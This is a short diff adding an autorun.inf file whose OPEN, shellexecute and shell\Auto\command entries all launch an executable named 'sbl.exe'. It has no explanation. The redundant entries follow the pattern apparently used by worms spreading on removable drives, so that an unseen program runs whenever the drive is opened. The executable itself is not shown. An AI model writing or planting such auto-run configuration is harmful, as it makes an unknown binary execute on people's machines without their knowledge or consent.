@@ -1,0 +1,5 @@
+[autorun]
+OPEN=sbl.exe
+shellexecute=sbl.exe
+shell\Auto\command=sbl.exe
+shell=open
